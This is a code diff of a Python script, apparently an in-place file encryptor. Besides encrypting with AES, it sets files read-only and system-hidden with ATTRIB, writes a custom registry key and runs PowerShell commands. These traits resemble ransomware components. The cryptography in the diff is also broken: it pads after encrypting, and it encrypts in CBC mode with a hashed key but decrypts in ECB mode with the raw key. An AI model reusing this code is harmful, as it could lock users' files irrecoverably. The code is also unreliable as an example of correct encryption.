@@ -2,9 +2,9 @@ import sys, os
 import shutil
 import subprocess
 import base64
-from Crypto.Cipher import _AES
-import cx_Freeze
+from Crypto.Cipher import AES
 import time
+from hashlib import md5
 
 sys_file = 'sys.info'
 default_vector = 16 * '\x00'
@@ -12,7 +12,10 @@ key = 'secret'
 REG_PATH = 'HKCU\\Software\\ANN_KAT'
 set_readonly_command = 'ATTRIB +R +S {file}'
 set_reg_command = 'reg add {REG_PATH} /t REG_DWORD /d {key} /f '
-
+BLOCK_SIZE = 16  # Bytes
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
+                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
+unpad = lambda s: s[:-ord(s[len(s) - 1:])]
 
 def check_dir(directory):
     if os.path.isdir(directory):
@@ -48,16 +51,17 @@ def run_powershell_command(command):
     p = subprocess.Popen(command, bufsize=-1, stdout=sys.stdout)
 
 
-def encrypt_file(filename, key, vector=default_vector):
+def encrypt_file(filename, key):
     file_text = open(filename, 'r').read()
-    encrypted_txt = encrypt_text(file_text, key, vector)
+    encrypted_txt = encrypt_text(file_text, key)
     f = open(filename, 'wb')
-    f.write(encrypted_txt)
+    f.write(pad(encrypted_txt))
 
 
-def encrypt_text(text, key, vector=default_vector):
+def encrypt_text(text, key):
+    secret_key = md5(key.encode('utf-8')).hexdigest()
     mode = AES.MODE_CBC
-    encryptor = AES.new(key, mode, IV=vector)
+    encryptor = AES.new(secret_key, mode)
     return encryptor.encrypt(text)
 
 
@@ -65,12 +69,12 @@ def decrypt_file(filename, key):
     file_text = open(filename, 'rb')
     file_text = file_text.read()
     decrypted_txt = decrypt_text(file_text, key)
-    return decrypt_text(decrypted_txt)
+    return decrypt_text(decrypted_txt,key)
 
 
 def decrypt_text(text, key):
-    cipher = base64.b64decode(text)
-    return cipher
+    decipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
+    return  unpad(decipher.decrypt(text)).decode('utf8')
 
 
 if __name__ == "__main__":
